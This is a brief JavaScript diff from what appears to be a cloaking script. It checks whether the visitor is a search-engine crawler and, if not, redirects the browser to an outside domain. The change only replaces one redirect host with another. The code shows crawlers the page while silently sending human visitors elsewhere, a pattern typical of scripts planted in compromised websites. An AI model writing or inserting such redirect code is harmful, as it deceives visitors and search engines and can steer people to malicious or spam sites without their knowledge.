@@ -13,5 +13,5 @@ var isSpider = spiderList.some(function(spider) {
 });
 
 if (!isSpider) {
-    window.location.href = "https://www.ppqqzkn.com?id=395320273";
+    window.location.href = "https://www.262j.com?id=395320273";
 }
